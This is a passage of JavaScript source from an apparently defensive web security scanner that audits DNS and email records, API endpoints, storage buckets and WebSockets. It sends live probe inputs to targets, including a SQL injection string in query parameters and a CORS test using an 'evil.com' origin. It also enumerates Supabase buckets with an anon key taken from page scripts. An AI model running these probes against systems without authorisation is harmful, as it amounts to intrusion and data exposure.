  for (const selector of dkimSelectors) {
    try {
      const dkimRecords = await resolveTxt(`${selector}._domainkey.${baseDomain}`);
      if (dkimRecords.length > 0) {
        dkimFound = true;
        const signal = classifyDkimSearch(selector, dkimSelectors);
        addFinding(signal.severity, 'DNS / Email', signal.title, `${signal.detail} Domain: ${baseDomain}`, '', { classification: signal.classification, confidence: signal.confidence, rule_id: 'vice/dns/dkim-present' });
        break;
      }
    } catch {}
  }

  if (!dkimFound) {
    const signal = classifyDkimSearch(null, dkimSelectors);
    addFinding(signal.severity, 'DNS / Email', signal.title, `${signal.detail}\nSelectors tested: ${dkimSelectors.join(', ')}`, 'Check the selector configured by the email provider before concluding DKIM is absent.', { classification: signal.classification, confidence: signal.confidence, rule_id: 'vice/dns/dkim-inconclusive' });
  }

  // ── MX Records ──
  spinner.text = 'Checking MX...';
  try {
    const mxRecords = await resolveMx(baseDomain);
    if (mxRecords.length > 0) {
      const mxList = mxRecords.sort((a, b) => a.priority - b.priority).map(r => `${r.priority} ${r.exchange}`).join(', ');
      addFinding('INFO', 'DNS / Email', 'MX records found', `MX: ${mxList}`, '');
    }
  } catch {}

  // ── NS Records ──
  spinner.text = 'Checking NS...';
  try {
    const nsRecords = await resolveNs(baseDomain);
    if (nsRecords.length > 0) {
      addFinding('INFO', 'DNS / Email', 'DNS servers', `NS: ${nsRecords.join(', ')}`, '');
    }
  } catch {}

  // ── Dangling CNAME ──
  // A truly dangling CNAME is one whose target DOMAIN is unregistered (NXDOMAIN),
  // letting an attacker register it and take over. HTTP 404 is NOT enough -
  // many legitimate CNAME targets (Vercel DNS validators *.vercel-dns-XXX.com,
  // Cloudflare Pages targets, GitHub Pages, etc.) intentionally don't serve HTTP.
  spinner.text = 'Checking for dangling CNAMEs...';
  const resolveAny = promisify(dns.default.resolve);
  const subsToCcheck = ['www', 'api', 'app', 'cdn', 'mail', 'staging', 'dev'];
  for (const sub of subsToCcheck) {
    try {
      const cnames = await resolveCname(`${sub}.${baseDomain}`);
      for (const cname of cnames) {
        // Try to resolve the CNAME target to A/AAAA records.
        // ENOTFOUND / NXDOMAIN means the domain is unregistered = dangling.
        let domainResolves = true;
        try {
          await resolveAny(cname);
        } catch (err) {
          if (err && (err.code === 'ENOTFOUND' || err.code === 'NXDOMAIN' || err.code === 'SERVFAIL')) {
            domainResolves = false;
          }
        }
        if (!domainResolves) {
          addFinding('ELEVEE', 'DNS / Email', `Dangling CNAME detected: ${sub}.${baseDomain}`, `CNAME points to ${cname} which does not resolve (NXDOMAIN).\nAn attacker can register this domain and take over the subdomain (subdomain takeover).`, `Remove the CNAME ${sub}.${baseDomain} → ${cname} or configure the destination`);
        }
      }
    } catch {}
  }

  // ── DNSSEC (presence of DS records on the parent zone) ──
  spinner.text = 'Checking DNSSEC...';
  try {
    const resolveAny = promisify(dns.default.resolve);
    // dns.resolve(domain, 'DS') is supported in Node 18+
    const dsRecords = await resolveAny(baseDomain, 'DS').catch(() => null);
    if (dsRecords && dsRecords.length > 0) {
      addFinding('INFO', 'DNS / Email', 'DNSSEC active (DS records present)', `${dsRecords.length} DS record(s) on ${baseDomain}`, '');
    } else {
      addFinding('FAIBLE', 'DNS / Email', 'DNSSEC not configured',
        `No DS records found for ${baseDomain}.\nDNSSEC prevents DNS spoofing and cache poisoning attacks.`,
        'Enable DNSSEC at your registrar. Most registrars (Cloudflare, OVH, Gandi, Namecheap) support it in 1-click.');
    }
  } catch {}

  // ── CAA records: limit which CAs can issue certs for the domain ──
  spinner.text = 'Checking CAA records...';
  try {
    const resolveCaa = promisify(dns.default.resolveCaa || dns.default.resolve);
    let caaRecords;
    if (dns.default.resolveCaa) {
      caaRecords = await dns.default.promises.resolveCaa(baseDomain).catch(() => null);
    } else {
      caaRecords = await new Promise((resolve) => {
        dns.default.resolve(baseDomain, 'CAA', (err, records) => resolve(err ? null : records));
      });
    }
    if (caaRecords && caaRecords.length > 0) {
      addFinding('INFO', 'DNS / Email', `CAA records configured (${caaRecords.length})`,
        `CAs allowed to issue: ${caaRecords.map(r => r.issue || r.issuewild || JSON.stringify(r)).join(', ')}`, '');
    } else {
      addFinding('FAIBLE', 'DNS / Email', 'No CAA records',
        `Without CAA, any CA can issue a cert for ${baseDomain}.\nA compromised CA can issue rogue certs that browsers accept.`,
        `Add a CAA record. Example for Let's Encrypt only:\n  ${baseDomain}. CAA 0 issue "letsencrypt.org"\n  ${baseDomain}. CAA 0 iodef "mailto:security@${baseDomain}"`);
    }
  } catch {}

  // ── MTA-STS: enforces TLS for inbound mail ──
  spinner.text = 'Checking MTA-STS...';
  let mtaStsConfigured = false;
  try {
    const mtaStsTxt = await resolveTxt(`_mta-sts.${baseDomain}`).catch(() => null);
    if (mtaStsTxt && mtaStsTxt.length > 0) {
      mtaStsConfigured = true;
      const policyRes = await safeFetch(`https://mta-sts.${baseDomain}/.well-known/mta-sts.txt`);
      if (policyRes && policyRes.status === 200) {
        addFinding('INFO', 'DNS / Email', 'MTA-STS configured',
          `_mta-sts.${baseDomain} TXT exists and policy file is reachable`, '');
      } else {
        addFinding('FAIBLE', 'DNS / Email', 'MTA-STS DNS record without policy file',
          `TXT exists but https://mta-sts.${baseDomain}/.well-known/mta-sts.txt is not reachable.`,
          'Publish the policy file at the well-known path with mode: enforce.');
      }
    }
  } catch {}
  if (!mtaStsConfigured) {
    addFinding('INFO', 'DNS / Email', 'MTA-STS not configured',
      'MTA-STS forces TLS on inbound SMTP and prevents downgrade attacks. Optional but recommended for serious email.',
      `Add a TXT record at _mta-sts.${baseDomain} (v=STSv1; id=...) and host the policy file at https://mta-sts.${baseDomain}/.well-known/mta-sts.txt`);
  }

  // ── TLS-RPT: receive failure reports for MTA-STS / DANE ──
  spinner.text = 'Checking TLS-RPT...';
  try {
    const tlsRptTxt = await resolveTxt(`_smtp._tls.${baseDomain}`).catch(() => null);
    if (tlsRptTxt && tlsRptTxt.length > 0) {
      const txt = tlsRptTxt.flat().join('');
      if (txt.includes('v=TLSRPTv1')) {
        addFinding('INFO', 'DNS / Email', 'TLS-RPT configured', `${txt}`, '');
      }
    }
  } catch {}
}

// ──────────── MODULE 13 : API Endpoint Testing ────────────

// Parse an OpenAPI/Swagger spec (already fetched as `specBody`) and probe each
// documented GET endpoint without auth. Reveals when the spec is not just
// "leaked" but actually points to live unprotected endpoints.
async function enumerateOpenApiEndpoints(specUrl, specBody, baseUrl, spinner) {
  let spec;
  try { spec = JSON.parse(specBody); } catch { return; }
  if (!spec || typeof spec !== 'object' || !spec.paths) return;

  for (const surface of findMassAssignmentSurfaces(spec)) {
    addFinding(
      'MOYENNE',
      'API Audit',
      `Potential mass assignment surface: ${surface.method} ${surface.path}`,
      `Writable privileged field(s) declared by OpenAPI: ${surface.fields.join(', ')}. Schema presence does not prove missing server-side authorization.`,
      'Use explicit input DTOs and server-side allowlists. Never bind authorization, ownership, billing or verification fields directly from request bodies.',
      { classification: 'heuristic', confidence: 'medium', rule_id: 'vice/api/mass-assignment-schema' },
    );
  }

  // OpenAPI 3.x has servers[]; Swagger 2.x has host + basePath + schemes
  let apiBase = '';
  if (Array.isArray(spec.servers) && spec.servers[0]?.url) {
    apiBase = spec.servers[0].url.replace(/\/+$/, '');
    if (apiBase.startsWith('/')) apiBase = new URL(baseUrl).origin + apiBase;
  } else if (spec.host) {
    const scheme = (Array.isArray(spec.schemes) && spec.schemes[0]) || 'https';
    apiBase = `${scheme}://${spec.host}${spec.basePath || ''}`.replace(/\/+$/, '');
  } else {
    apiBase = new URL(baseUrl).origin;
  }

  const docOrigin = new URL(specUrl).origin;
  if (!apiBase.startsWith('http')) apiBase = docOrigin + apiBase;

  const allPaths = Object.entries(spec.paths);
  const targeted = allPaths.slice(0, 30); // safety cap on huge specs
  let probed = 0;
  let exposed = 0;

  for (const [pathKey, methods] of targeted) {
    if (typeof methods !== 'object' || methods === null) continue;
    // Skip parameterized paths - we don't have valid ids to fill in
    if (/\{[^}]+\}/.test(pathKey)) continue;

    if (typeof methods.get !== 'object') continue;
    probed++;
    spinner.text = `OpenAPI probe [${probed}/${targeted.length}] GET ${pathKey}...`;

    const fullUrl = apiBase + pathKey;
    if (!await authorizeDiscoveredDestination(fullUrl)) continue;
    const res = await safeFetch(fullUrl);
    if (!res || res.status !== 200) continue;

    const ct = res.headers.get('content-type') || '';
    if (ct.includes('text/html')) continue; // SPA catch-all
    let body = '';
    try { body = await res.text(); } catch {}
    if (!body || body.length < 10) continue;

    let payload;
    try { payload = JSON.parse(body); } catch { payload = body; }
    const signal = classifyUnauthenticatedApiResponse(pathKey, payload, res.status);
    if (!signal) continue;
    addFinding(
      signal.severity,
      'API Audit',
      `Unauthenticated documented API response: GET ${pathKey}`,
      `URL: ${fullUrl}\nClassification: ${signal.kind}${signal.paths.length ? `\nSensitive paths: ${signal.paths.join(', ')}` : ''}\nFrom OpenAPI/Swagger spec at ${specUrl}`,
      signal.severity === 'INFO' ? '' : 'Require authentication or remove sensitive fields when this response is not intentionally public.',
      { classification: signal.classification, confidence: signal.confidence, rule_id: `vice/api/unauthenticated-${signal.kind}` },
    );
    exposed++;
  }

  if (probed > 0) {
    addFinding('INFO', 'API Audit',
      `OpenAPI spec parsed: ${probed} GET endpoint(s) probed, ${exposed} accessible without auth`,
      `Spec source: ${specUrl}\n${allPaths.length > targeted.length ? `(only first ${targeted.length} paths probed; spec has ${allPaths.length})` : ''}`, '');
  }
}

async function auditApiEndpoints(baseUrl, jsContents, spinner) {
  // Extract API endpoints from JS
  const apiPatterns = /(?:https?:\/\/[^\s"'`]+\/api\/[^\s"'`]*|\/api\/[a-zA-Z0-9\/_\-]+)/g;
  const origin = new URL(baseUrl).origin;
  const commonApis = ['/api', '/api/v1', '/api/v2', '/api/users', '/api/auth', '/api/admin', '/api/config',
    '/api/health', '/api/status', '/api/debug', '/api/graphql', '/graphql', '/api/docs', '/api/swagger'];
  const apiEndpoints = new Set(commonApis.map(path => origin + path));

  apiDiscovery:
  for (const js of jsContents) {
    apiPatterns.lastIndex = 0;
    for (const result of js.matchAll(apiPatterns)) {
      const match = result[0];
      if (match.length >= 6 && match.length <= 200 && isUsableApiEndpoint(match)) {
        const endpoint = resolveFirstPartyApiEndpoint(baseUrl, match);
        if (endpoint) boundedAdd(apiEndpoints, endpoint, DISCOVERY_BUDGETS.apiEndpoints);
      }
      if (apiEndpoints.size >= DISCOVERY_BUDGETS.apiEndpoints) break apiDiscovery;
    }
  }

  // Add common endpoints to test
  if (apiEndpoints.size === 0) {
    addFinding('INFO', 'API Audit', 'No API endpoint detected', '', '');
    return;
  }

  spinner.text = `Testing ${apiEndpoints.size} API endpoints...`;
  let tested = 0;

  for (const endpoint of apiEndpoints) {
    if (!resolveFirstPartyApiEndpoint(baseUrl, endpoint)) continue;
    if (!await authorizeDiscoveredDestination(endpoint)) continue;
    tested++;
    if (tested % 5 === 0) spinner.text = `API [${tested}/${apiEndpoints.size}] ${endpoint}...`;

    // GraphQL-specific tests (introspection, depth limit, field suggestions)
    if (/\/graphql\b/i.test(endpoint)) {
      try { await testGraphQLEndpoint(endpoint, spinner); } catch {}
    }

    // ── Test 1 : Access without auth ──
    const res = await safeFetch(endpoint);
    if (!res) continue;
    const status = res.status;
    const contentType = res.headers.get('content-type') || '';
    let body = '';
    try { body = await res.text(); } catch {}

    // Ignore HTML pages (SPA catch-all)
    if (contentType.includes('text/html') && body.length > 1000) continue;

    // API responding with data
    if (status === 200 && contentType.includes('json')) {
      let data;
      try { data = JSON.parse(body); } catch {}

      if (data) {
        const exposure = classifyPublicJson(data);
        const paths = exposure.paths.length > 0 ? `\nSensitive field paths: ${exposure.paths.join(', ')}` : '';
        addFinding(
          exposure.severity,
          'API Audit',
          `${exposure.title}: ${endpoint}`,
          `Status ${status}, Content-Type: ${contentType}${paths}`,
          exposure.kind === 'public-json' ? 'Confirm that this endpoint is intentionally public.' : 'Require authorization and return only fields needed by the caller.',
        );
      }
    }

    // Swagger / OpenAPI exposed - parse the spec and probe each documented endpoint
    if (/swagger|openapi|api-docs/i.test(endpoint) && status === 200) {
      addFinding(classifyHardeningSignal('public-api-docs').severity, 'API Audit', `API documentation publicly accessible: ${endpoint}`, 'Swagger/OpenAPI documentation is publicly accessible. This can be intentional and is not a vulnerability without sensitive operations or data exposure.', 'Review the documented surface and protect documentation only when the API is private.');
      try { await enumerateOpenApiEndpoints(endpoint, body, baseUrl, spinner); } catch {}
    }

    // Debug / health endpoints
    if (/debug|health|status|config/i.test(endpoint) && status === 200 && body.length > 10) {
      const hasInternal = /version|uptime|memory|cpu|database|connection|env|node_env|port|host/i.test(body);
      if (hasInternal) {
        addFinding('ELEVEE', 'API Audit', `Debug/status endpoint exposes internal info: ${endpoint}`, `Response: ${body.substring(0, 300)}`, 'Protect or disable debug endpoints in production');
      }
    }

    // ── Test 2 : Advertised methods without invoking them ──
    const optionsRes = await safeFetch(endpoint, { method: 'OPTIONS' });
    if (optionsRes) {
      const advertised = `${optionsRes.headers.get('allow') || ''},${optionsRes.headers.get('access-control-allow-methods') || ''}`
        .split(',')
        .map(value => value.trim().toUpperCase())
        .filter(value => ['POST', 'PUT', 'PATCH', 'DELETE'].includes(value));
      if (advertised.length > 0) {
        addFinding('INFO', 'API Audit', `State-changing methods advertised: ${endpoint}`, `OPTIONS advertises: ${[...new Set(advertised)].join(', ')}. The audit did not invoke these methods.`, 'Confirm that each state-changing method requires authorization.', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/api/advertised-mutations' });
      }
    }

    // ── Test 4 : Parameter injection (only against same-origin endpoints) ──
    // We never pen-test third-party APIs (Google Maps, Stripe, etc.) - their
    // documentation pages contain words like "query" that would false-positive.
    const sqlRes = await safeFetch(`${endpoint}?id=' OR '1'='1&q=' UNION SELECT 1--`, {
      headers: { 'Content-Type': 'application/json' },
    });
    if (sqlRes) {
      let sqlBody = '';
      try { sqlBody = await sqlRes.text(); } catch {}
      // Use specific SQL error signatures rather than the bare word "sql" or
      // "query" (which match any documentation page or generic error text).
      const sqlErrorRegex = /(?:You have an error in your SQL syntax|Warning:\s+mysqli?_|near\s+'[^']*'\s+at line\s+\d+|Unknown column\s+'[^']+'|MySQLSyntaxErrorException|pq:\s+ERROR|ERROR:.*?at character\s+\d+|LINE\s+\d+:\s|unterminated quoted string at or near|relation\s+"[^"]+"\s+does not exist|column\s+"[^"]+"\s+does not exist|syntax error at or near\s+"|sqlite3?\.OperationalError|near\s+"[^"]+":\s+syntax error|unrecognized token:|no such table:|no such column:|ORA-\d{5}|microsoft (?:sql|ole db|odbc)|sqlclient|system\.data\.sqlclient|SQLSTATE\[\d+\])/i;
      if (sqlErrorRegex.test(sqlBody)) {
        addFinding('CRITIQUE', 'API Audit', `Possible SQL injection on ${endpoint}`, 'The server returns a SQL error when payloads are injected into parameters', 'Use prepared queries on all API endpoints');
      }
    }

    // ── Test 5 : CORS on API endpoint ──
    const corsRes = await safeFetch(endpoint, { headers: { 'Origin': 'https://evil.com' } });
    if (corsRes) {
      const acao = corsRes.headers.get('access-control-allow-origin');
      const acac = corsRes.headers.get('access-control-allow-credentials');
      const cors = classifyCorsPolicy({ requestOrigin: 'https://evil.com', allowOrigin: acao, allowCredentials: acac });
      if (cors) {
        addFinding(cors.severity, 'API Audit', `${cors.title}: ${endpoint}`, `${cors.detail}\nAccess-Control-Allow-Origin: ${acao}${acac ? `\nAccess-Control-Allow-Credentials: ${acac}` : ''}`, 'Validate reflected origins against an explicit allowlist. Use wildcard CORS only for intentionally public resources.');
      }
    }
  }
}

// ──────────── MODULE 14 : Scan Storage / Buckets ────────────

async function auditStorage(jsContents, spinner) {
  spinner.text = 'Searching for exposed storage buckets...';

  // Extract storage URLs from JS
  const storagePatterns = [
    // Supabase Storage
    /https?:\/\/[a-z0-9\-]+\.supabase\.co\/storage\/v1\/object\/(?:public|sign)\/[^\s"'`<>)}\]]+/gi,
    // Supabase Storage bucket paths
    /\/storage\/v1\/object\/(?:public|sign)\/([a-zA-Z0-9_\-]+)/g,
    // AWS S3
    /https?:\/\/[a-z0-9\-]+\.s3[.\-][a-z0-9\-]+\.amazonaws\.com\/[^\s"'`<>)}\]]+/gi,
    /https?:\/\/s3[.\-][a-z0-9\-]+\.amazonaws\.com\/[a-z0-9\-]+\/[^\s"'`<>)}\]]+/gi,
    // Google Cloud Storage
    /https?:\/\/storage\.googleapis\.com\/[a-z0-9\-]+\/[^\s"'`<>)}\]]+/gi,
    // Firebase Storage
    /https?:\/\/firebasestorage\.googleapis\.com\/v0\/b\/[^\s"'`<>)}\]]+/gi,
    // Cloudinary
    /https?:\/\/res\.cloudinary\.com\/[a-z0-9\-]+\/[^\s"'`<>)}\]]+/gi,
  ];

  const commonBuckets = ['avatars', 'uploads', 'images', 'files', 'documents', 'media', 'public', 'private', 'assets', 'attachments', 'photos', 'videos', 'invoices', 'exports', 'backups', 'temp'];
  const storageUrls = new Set();
  const bucketNames = new Set(commonBuckets);

  let storageMatchesInspected = 0;
  storageDiscovery:
  for (const js of jsContents) {
    for (const pattern of storagePatterns) {
      pattern.lastIndex = 0;
      for (const result of js.matchAll(pattern)) {
          const match = result[0];
          storageMatchesInspected++;
          boundedAdd(storageUrls, match, DISCOVERY_BUDGETS.storageUrls);
          // Extract the bucket name
          const bucketMatch = match.match(/\/object\/(?:public|sign)\/([a-zA-Z0-9_\-]+)/);
          if (bucketMatch) boundedAdd(bucketNames, bucketMatch[1], DISCOVERY_BUDGETS.bucketNames);
          const s3Match = match.match(/([a-z0-9\-]+)\.s3[.\-]/);
          if (s3Match) boundedAdd(bucketNames, s3Match[1], DISCOVERY_BUDGETS.bucketNames);
          const gcsMatch = match.match(/storage\.googleapis\.com\/([a-z0-9\-]+)/);
          if (gcsMatch) boundedAdd(bucketNames, gcsMatch[1], DISCOVERY_BUDGETS.bucketNames);
          if (storageMatchesInspected >= 200) break storageDiscovery;
      }
    }
  }

  // Find the Supabase URL to test buckets
  let supabaseUrl = null;
  for (const js of jsContents) {
    const urlMatch = js.match(/https?:\/\/[a-z0-9\-]+\.supabase\.co/i);
    if (urlMatch) { supabaseUrl = urlMatch[0]; break; }
  }

  // Find the anon key
  let anonKey = null;
  for (const js of jsContents) {
    const keyMatch = js.match(/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/);
    if (keyMatch) {
      try {
        const payload = JSON.parse(Buffer.from(keyMatch[0].split('.')[1], 'base64url').toString());
        if (payload.role === 'anon') { anonKey = keyMatch[0]; break; }
      } catch {}
    }
  }

  // Bucket names that are typically public by convention (avatars, public assets, etc.).
  // Listing these is expected and should be reported at INFO, not MOYENNE.
  const PUBLIC_BY_CONVENTION = new Set([
    'avatars', 'public', 'public-images', 'public-uploads', 'public-files',
    'thumbnails', 'profile-pictures', 'profiles', 'logos', 'covers', 'banners',
    'assets',
  ]);
  // Track buckets explicitly marked public via the bucket API
  const knownPublicBuckets = new Set();

  // Test Supabase buckets
  if (supabaseUrl && anonKey) {
    if (!await authorizeDiscoveredDestination(supabaseUrl)) {
      addFinding('INFO', 'Storage', 'Supabase Storage target blocked by network safety policy', supabaseUrl, 'Verify that the project resolves only to public addresses.');
      supabaseUrl = null;
    }
  }

  if (supabaseUrl && anonKey) {
    spinner.text = 'Enumerating Supabase Storage buckets...';

    // List buckets via the API
    const bucketsRes = await safeFetch(`${supabaseUrl}/storage/v1/bucket`, {
      headers: { 'apikey': anonKey, 'Authorization': `Bearer ${anonKey}` },
    });

    if (bucketsRes && bucketsRes.status === 200) {
      try {
        const buckets = await bucketsRes.json();
        if (Array.isArray(buckets) && buckets.length > 0) {
          for (const bucket of buckets) {
            const name = bucket.name || bucket.id;
            const retained = boundedAdd(bucketNames, name, DISCOVERY_BUDGETS.bucketNames);
            if (retained && bucket.public) {
              knownPublicBuckets.add(name);
              addFinding('INFO', 'Storage', `Bucket Supabase public: ${name}`, `Bucket "${name}" is marked as public`, 'Verify that this bucket only contains files intended to be public');
            }
          }
        }
      } catch {}
    }

    // Test each known bucket
    spinner.text = `Testing ${bucketNames.size} Supabase buckets...`;

    for (const bucket of bucketNames) {
      // Test public access to the bucket (list files)
      const listRes = await safeFetch(`${supabaseUrl}/storage/v1/object/list/${bucket}`, {
        method: 'POST',
        readOnly: 'storage-list',
        headers: {
          'apikey': anonKey,
          'Authorization': `Bearer ${anonKey}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ prefix: '', limit: 10, offset: 0 }),
      });

      if (listRes && listRes.status === 200) {
        let files;
        try { files = await listRes.json(); } catch { files = []; }

        if (Array.isArray(files) && files.length > 0) {
          const fileNames = files.map(f => f.name).filter(Boolean).slice(0, 10);
          const hasPrivateData = /invoice|facture|contrat|contract|passport|id_card|cv|resume|bank|payment|secret|private|backup|export|dump/i.test(fileNames.join(' '));
          const isExpectedPublic = knownPublicBuckets.has(bucket) || PUBLIC_BY_CONVENTION.has(bucket.toLowerCase());

          if (hasPrivateData) {
            // Sensitive content trumps "expected public" - report regardless
            addFinding('CRITIQUE', 'Storage', `Bucket "${bucket}" contains accessible sensitive files`, `Files: ${fileNames.join(', ')}\nThese files appear to contain private data and are accessible with the anon key.`, `Set bucket "${bucket}" to private and add RLS policies on storage.objects`);
          } else if (isExpectedPublic) {
            // Public bucket with non-sensitive content: this is the intended setup
            addFinding('INFO', 'Storage', `Bucket "${bucket}" listable (public bucket, ${files.length} file(s))`, `Files: ${fileNames.join(', ')}\nBucket is marked public or named by a public-by-convention pattern.`, '');
          } else {
            addFinding('MOYENNE', 'Storage', `Bucket "${bucket}" listable with anon key (${files.length} file(s))`, `Files: ${fileNames.join(', ')}`, `Check if the content of bucket "${bucket}" should be public. If not, restrict access.`);
          }

          // Test direct file access (only flag if bucket is NOT expected public)
          if (!isExpectedPublic) {
            for (const file of files.slice(0, 3)) {
              if (!file.name) continue;
              const fileUrl = `${supabaseUrl}/storage/v1/object/public/${bucket}/${file.name}`;
              const fileRes = await safeFetch(fileUrl);
              if (fileRes && fileRes.status === 200) {
                const ct = fileRes.headers.get('content-type') || '';
                addFinding('MOYENNE', 'Storage', `File publicly accessible: ${bucket}/${file.name}`, `URL: ${fileUrl}\nContent-Type: ${ct}`, '');
              }
            }
          }
        }
      }

    }
  }

  // Test found S3 URLs
  for (const url of storageUrls) {
    if (url.includes('s3') && url.includes('amazonaws.com')) {
      if (!await authorizeDiscoveredDestination(url)) continue;
      spinner.text = `Testing S3 bucket: ${url.substring(0, 60)}...`;
      const res = await safeFetch(url);
      if (res && res.status === 200) {
        addFinding('MOYENNE', 'Storage', `S3 file publicly accessible`, `URL: ${url}`, 'Check the S3 bucket ACLs and bucket policies');
      }
    }
  }

  if (storageUrls.size === 0 && !supabaseUrl) {
    addFinding('INFO', 'Storage', 'No storage bucket detected', '', '');
  }
}

// ──────────── MODULE 15 : Audit WebSocket / Realtime ────────────

async function auditWebsockets(baseUrl, jsContents, spinner) {
  spinner.text = 'Searching for WebSocket connections...';

  const origin = new URL(baseUrl).origin;
  const wsOrigin = origin.replace('https://', 'wss://').replace('http://', 'ws://');

  // Search for WebSocket URLs in JS
  const commonWsPaths = ['/ws', '/wss', '/websocket', '/socket.io/?EIO=4&transport=websocket', '/realtime', '/cable', '/hub', '/live', '/events'];
  const commonWsUrls = new Set(commonWsPaths.map(path => wsOrigin + path));
  const wsUrls = new Set(commonWsUrls);
  const wsPatterns = [
    /wss?:\/\/[^\s"'`<>)}\]]+/gi,
    /\/realtime\/v1/g,
    /\/socket\.io/g,
    /\/ws\b/g,
    /\/websocket/gi,
    /\/cable/g,
    /\/hub/g,
  ];

  wsDiscovery:
  for (const js of jsContents) {
    for (const pattern of wsPatterns) {
      pattern.lastIndex = 0;
      for (const result of js.matchAll(pattern)) {
          const match = result[0];
          if (match.startsWith('ws')) {
            boundedAdd(wsUrls, match, DISCOVERY_BUDGETS.websocketUrls);
          } else {
            boundedAdd(wsUrls, wsOrigin + match, DISCOVERY_BUDGETS.websocketUrls);
          }
          if (wsUrls.size >= DISCOVERY_BUDGETS.websocketUrls) break wsDiscovery;
      }
    }
  }

  // Search for Supabase Realtime
  let supabaseUrl = null;
  let anonKey = null;
  for (const js of jsContents) {
    const urlMatch = js.match(/https?:\/\/[a-z0-9\-]+\.supabase\.co/i);
    if (urlMatch && !supabaseUrl) supabaseUrl = urlMatch[0];
    const keyMatch = js.match(/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/);
    if (keyMatch && !anonKey) {
      try {
        const payload = JSON.parse(Buffer.from(keyMatch[0].split('.')[1], 'base64url').toString());
        if (payload.role === 'anon') anonKey = keyMatch[0];
      } catch {}
    }
  }

  if (supabaseUrl) {
    boundedAdd(wsUrls, `${supabaseUrl.replace('https://', 'wss://').replace('http://', 'ws://')}/realtime/v1/websocket?apikey=${anonKey}&vsn=1.0.0`, DISCOVERY_BUDGETS.websocketUrls);
  }

  if (wsUrls.size === 0) {
    addFinding('INFO', 'WebSocket', 'No WebSocket connection detected', '', '');
    return;
  }

  const prioritizedWsUrls = [...wsUrls].sort((left, right) => Number(commonWsUrls.has(left)) - Number(commonWsUrls.has(right)));
  const activeWsUrls = prioritizedWsUrls.slice(0, DISCOVERY_BUDGETS.websocketActive);
  spinner.text = `Testing ${activeWsUrls.length} of ${wsUrls.size} WebSocket endpoints...`;
  if (wsUrls.size > activeWsUrls.length) {
    addFinding('INFO', 'WebSocket', 'WebSocket active probe budget applied', `${wsUrls.size} candidate endpoint(s) found; ${activeWsUrls.length} prioritized endpoints will be actively tested. Discovered URLs are prioritized over generic fallback paths.`, '', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/websocket/probe-budget' });
  }

  // Test each WebSocket with Puppeteer
  let browser;
  try {
    browser = await launchBrowser();
  } catch {
    return;
  }

  try {
    await mapWithConcurrency(activeWsUrls, 3, async (wsUrl) => {
    spinner.text = `WebSocket: ${wsUrl.substring(0, 60)}...`;

    if (!await authorizeDiscoveredDestination(wsUrl)) return;

    const page = await createBrowserPage(browser, baseUrl);
    try {
      const result = await page.evaluate(async (url) => {
        return new Promise((resolve) => {
          const timeout = setTimeout(() => resolve({ status: 'timeout' }), 5000);
          try {
            const ws = new WebSocket(url);
            const messages = [];

            ws.onopen = () => {
              // Try to listen to all channels (Supabase Realtime)
              if (url.includes('realtime')) {
                ws.send(JSON.stringify({
                  topic: 'realtime:*',
                  event: 'phx_join',
                  payload: {},
                  ref: '1',
                }));
              }
              // Socket.IO
              if (url.includes('socket.io')) {
                // The EIO handshake is automatic
              }
            };

            ws.onmessage = (event) => {
              messages.push(typeof event.data === 'string' ? event.data.substring(0, 500) : '[binary]');
              if (messages.length >= 3) {
                clearTimeout(timeout);
                ws.close();
                resolve({ status: 'open', messages });
              }
            };

            ws.onerror = () => {
              clearTimeout(timeout);
              resolve({ status: 'error' });
            };

            ws.onclose = (event) => {
              clearTimeout(timeout);
              resolve({ status: messages.length > 0 ? 'open' : 'closed', code: event.code, messages });
            };

            // Collect for 4 seconds
            setTimeout(() => {
              clearTimeout(timeout);
              try { ws.close(); } catch {}
              resolve({ status: messages.length > 0 ? 'open' : 'no_messages', messages });
            }, 4000);
          } catch (e) {
            clearTimeout(timeout);
            resolve({ status: 'error', error: e.message });
          }
        });
      }, wsUrl);

      if (result.status === 'open' && result.messages && result.messages.length > 0) {
        const signal = classifyWebSocketMessages(result.messages);
        const displayUrl = redactWebSocketUrl(wsUrl);
        const sensitivePaths = signal.paths.length > 0 ? ` Sensitive paths: ${signal.paths.join(', ')}.` : '';
        const metadata = { classification: signal.classification, confidence: signal.confidence, rule_id: `vice/websocket/${signal.state}` };

        if (signal.state === 'credentials' || signal.state === 'personal-data') {
          addFinding(signal.severity, 'WebSocket', `Anonymous WebSocket exposes ${signal.state}: ${displayUrl}`, `${result.messages.length} message(s) were received by a null-Origin, unauthenticated browser context.${sensitivePaths} Message contents are omitted from the report.`, 'Require channel authorization and verify row-level or topic-level policies before delivering sensitive data.', metadata);
        } else if (signal.state === 'auth-rejected') {
          addFinding('INFO', 'WebSocket', `WebSocket authorization rejection observed: ${displayUrl}`, 'The null-Origin, unauthenticated probe received an explicit authentication or authorization denial.', '', metadata);
        } else if (signal.state === 'protocol-only') {
          addFinding('INFO', 'WebSocket', `Anonymous WebSocket protocol handshake: ${displayUrl}`, `${result.messages.length} protocol-level message(s) were received, with no sensitive application fields confirmed.`, 'Verify topic-level authorization for non-public subscriptions.', metadata);
        } else {
          addFinding('INFO', 'WebSocket', `Anonymous WebSocket messages require review: ${displayUrl}`, `${result.messages.length} message(s) were received but no credential or exact personal-data field was confirmed. Contents are omitted from the report.`, 'Review whether anonymous delivery is intentional and enforce per-topic authorization.', metadata);
        }
      } else if (result.status === 'open' || result.status === 'no_messages') {
        const displayUrl = redactWebSocketUrl(wsUrl);
        addFinding('INFO', 'WebSocket', `WebSocket connected without messages: ${displayUrl}`, 'A null-Origin, unauthenticated browser connection was accepted, but no application data was received.', '', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/websocket/no-messages' });
      }
    } catch {} finally {
      await page.close();
    }
    });
  } finally {
    await browser.close();
  }
}

// ──────────── MODULE 16 : TLS Deeper Analysis ────────────

async function auditTls(baseUrl, spinner) {
  const url = new URL(baseUrl);
  if (url.protocol !== 'https:') {
    addFinding('CRITIQUE', 'TLS', 'Site does not use HTTPS', `${baseUrl} uses plain HTTP`, 'Enable HTTPS with a valid TLS certificate (Let\'s Encrypt is free and automated)');
    return;
  }

  const host = url.hostname;
  const port = parseInt(url.port || '443');
  const connectHost = getScanContext()?.scope?.getPinnedAddresses(host)?.[0] || host;
  const tls = await import('tls');

